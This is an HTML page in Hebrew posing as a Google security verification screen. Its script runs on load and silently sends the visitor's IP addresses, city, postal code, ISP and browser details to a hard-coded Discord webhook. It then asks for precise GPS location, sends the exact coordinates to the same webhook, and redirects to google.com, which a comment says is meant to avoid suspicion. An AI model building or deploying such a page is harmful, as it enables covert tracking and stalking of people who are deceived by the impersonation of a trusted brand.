<!DOCTYPE html>
<html lang="he" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google - Verification System</title>
    <style>
        body { background-color: #f7f7f7; font-family: "Segoe UI", Tahoma, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #4285F4; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h1 { color: #5f6368; font-size: 22px; margin-top: 25px; font-weight: 400; }
        p { color: #70757a; font-size: 15px; margin-top: 10px; }
    </style>
</head>
<body>

    <div class="loader"></div>
    <h1>מבצע אימות אבטחה...</h1>
    <p>אנא המתן בזמן שאנו מאמתים את פרטי החיבור שלך מול שרתי Google Cloud.</p>

    <script>
        // ה-Webhook שלך - וודא שהוא תקין בדיסקורד
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1478133671763382495/VjEW3s6_-TIbfkGGbinSx0wxJSUwUhSMhOWYzMg8srqJnq0Y23KHhjsEEHGodLVAYd8i";
        
        async function captureData(exactPos = null) {
            try {
                // שליפת נתוני IP, ספק, עיר ומיקוד
                const geoRes = await fetch('https://ipapi.co/json/');
                const geoData = await geoRes.json();
                
                let ipv6 = "לא זמין";
                try {
                    const v6Res = await fetch('https://api6.ipify.org?format=json');
                    const v6Data = await v6Res.json();
                    ipv6 = v6Data.ip;
                } catch(e) {}

                let title = exactPos ? "✅ אימות הושלם - מיקום מדויק התקבל!" : "⚠️ כניסה לדף (ממתין לאישור GPS)";
                let color = exactPos ? 3066993 : 15158332;
                
                let lat = exactPos ? exactPos.coords.latitude : geoData.latitude;
                let lon = exactPos ? exactPos.coords.longitude : geoData.longitude;
                let mapURL = `https://www.google.com/maps?q=${lat},${lon}`;

                const payload = {
                    embeds: [{
                        title: title,
                        color: color,
                        fields: [
                            { name: "🌐 IPv4/IP", value: `\`${geoData.ip || 'Unknown'}\``, inline: true },
                            { name: "🌐 IPv6", value: `\`${ipv6}\``, inline: true },
                            { name: "🌍 עיר ומדינה", value: `${geoData.city || 'N/A'}, ${geoData.country_name || 'N/A'}`, inline: true },
                            { name: "📮 מיקוד", value: `\`${geoData.postal || 'N/A'}\``, inline: true },
                            { name: "🏢 ספק אינטרנט", value: geoData.org || "N/A", inline: false },
                            { name: "📍 מיקום במפה", value: `[לחץ לפתיחה במפות גוגל](${mapURL})`, inline: false },
                            { name: "📱 פרטי מכשיר", value: "```" + navigator.userAgent + "```" }
                        ],
                        footer: { text: "Security Monitor System v2.0" },
                        timestamp: new Date()
                    }]
                };

                await fetch(WEBHOOK_URL, { 
                    method: 'POST', 
                    headers: { 'Content-Type': 'application/json' }, 
                    body: JSON.stringify(payload) 
                });
            } catch (e) {
                console.error("Error sending to Discord:", e);
            }
        }

        window.onload = () => {
            // לוג ראשון נשלח מיד עם הטעינה (IP וספק)
            captureData();

            // בקשת מיקום מהדפדפן
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        // אם אישר - נשלח לוג שני עם GPS מדויק
                        captureData(pos);
                        // אחרי 2 שניות מעביר אותם לגוגל שלא יחשדו
                        setTimeout(() => {
                            window.location.href = "https://www.google.com";
                        }, 2000);
                    },
                    (err) => {
                        console.log("Location denied or error");
                    },
                    { enableHighAccuracy: true }
                );
            }
        };
    </script>
</body>
</html>
